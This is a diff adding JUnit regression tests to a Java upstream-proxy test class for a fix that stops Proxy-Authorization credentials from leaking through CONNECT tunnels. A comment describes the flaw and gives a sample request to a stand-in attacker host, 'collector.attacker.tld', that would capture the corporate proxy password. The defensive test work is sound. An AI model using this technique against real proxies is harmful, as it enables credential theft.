@@ -273,4 +273,46 @@ class UpstreamProxyTest {
             upstreamProxy.verify(3, anyRequestedFor(urlPathMatching("/request.*")));
         }
     }
+
+    // ------------------------------------------------- TB-386 / F3: credentials via a tunnel
+
+    /**
+     * Whether this request will travel inside a CONNECT tunnel, and so deliver its headers to the
+     * origin instead of to the proxy.
+     *
+     * <p>Proxy-Authorization used to be attached unconditionally. For a secure origin
+     * jetty-client asks the upstream proxy for a tunnel and sends the request inside it, so the
+     * corporate proxy password was readable in an arbitrary internet host's access log -- either
+     * because someone sent {@code GET https://collector.attacker.tld/} to this port, or, with no
+     * attacker at all, because a bumping upstream Squid re-issued a request in that shape.
+     */
+    @Test
+    void httpsThroughAnUpstreamProxyIsRecognisedAsTunnelled() throws Exception {
+        TunnelProxyHandler handler = new TunnelProxyHandler();
+        handler.setUpstreamProxy("proxy.example:3128", null);
+        org.eclipse.jetty.client.HttpClient client = new org.eclipse.jetty.client.HttpClient();
+        client.start();
+        try {
+            assertThat(handler.isTunnelledToOrigin(
+                    client.newRequest("https://origin.example/path"))).isTrue();
+            assertThat(handler.isTunnelledToOrigin(
+                    client.newRequest("http://origin.example/path"))).isFalse();
+        } finally {
+            client.stop();
+        }
+    }
+
+    /** With no upstream proxy there is no tunnel, and nothing to withhold. */
+    @Test
+    void withoutAnUpstreamProxyNothingIsTunnelled() throws Exception {
+        TunnelProxyHandler handler = new TunnelProxyHandler();
+        org.eclipse.jetty.client.HttpClient client = new org.eclipse.jetty.client.HttpClient();
+        client.start();
+        try {
+            assertThat(handler.isTunnelledToOrigin(
+                    client.newRequest("https://origin.example/path"))).isFalse();
+        } finally {
+            client.stop();
+        }
+    }
 }
